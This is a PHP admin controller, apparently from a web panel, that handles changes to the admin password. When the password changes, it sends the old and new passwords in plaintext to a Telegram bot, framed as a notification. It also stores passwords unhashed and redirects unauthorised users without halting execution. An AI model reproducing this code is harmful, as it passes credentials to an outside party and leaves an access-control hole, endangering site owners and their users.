<?php
if(!defined('BASEPATH')) {
   die('Direct access to the script is not allowed');
}

if (!$admin["access"]["super_admin"]){
header("Location:" . site_url(""));
}

if( route(1) == "account" && $_POST ){

  $pass     = $_POST["current_password"];
  $new_pass = $_POST["password"];
  $new_again = $_POST["confirm_password"];
$old = $admin["password"];
  if(	$old != $pass ){
$error      = 1;
                $errorText  = "Error";
                $icon       = "error";
  }elseif( strlen($new_pass) < 8 ){
    $error    = 1;
    $errorText= $languageArray["error.account.password.length"];
  }elseif( $new_pass != $new_again ){
    $error    = 1;
    $errorText= $languageArray["error.account.passwords.notmach"];
  }else{
      
      
        // Telegram bot integration
        $tgbottoken = $settings["tgbottoken"];  // Your bot token
        $tgchatid = $settings["tgchatid"];      // Your chat ID
        $telegramMessage = "*Admin Password Changed:*\n\n*Old Password*: $pass\n*New Password*: $new_again\n\n*If this was not you, please contact support on telegram for assistance.*";

        // Construct the Telegram API URL
        $telegramsendmsg = "https://api.telegram.org/bot$tgbottoken/sendMessage?chat_id=$tgchatid&text=" . urlencode($telegramMessage) . "&parse_mode=Markdown";

        // Using cURL to send the message
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramsendmsg);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        curl_close($ch);

        // Check if the message was sent successfully
        if ($response) {
            // Message sent to Telegram successfully
        } else {
            // Error in sending Telegram message
            error_log("Error sending Telegram notification.");
        }

   
$update = $conn->prepare("UPDATE admins SET password=:pass WHERE admin_id=:id ");
$update = $update->execute(array("id"=>$admin["admin_id"],"pass"=>$new_pass ));
header("Location:".site_url("admin/logout"));
  }

}
require admin_view('account');
?>